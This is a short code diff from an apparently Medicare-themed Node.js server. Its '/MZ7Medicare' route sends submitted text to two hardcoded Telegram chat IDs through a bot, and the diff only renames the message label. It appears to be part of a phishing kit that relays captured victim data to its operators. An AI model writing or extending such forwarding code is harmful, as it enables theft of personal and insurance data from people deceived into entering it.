@@ -456,7 +456,7 @@ app.post("/MZ7Medicare", (req, res) => {
         MZ7 = 0;
       } else {
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicarePutin:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareMZ7:\n${originalText}`
         );
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1225398527&text=MediCare:\n${originalText}`
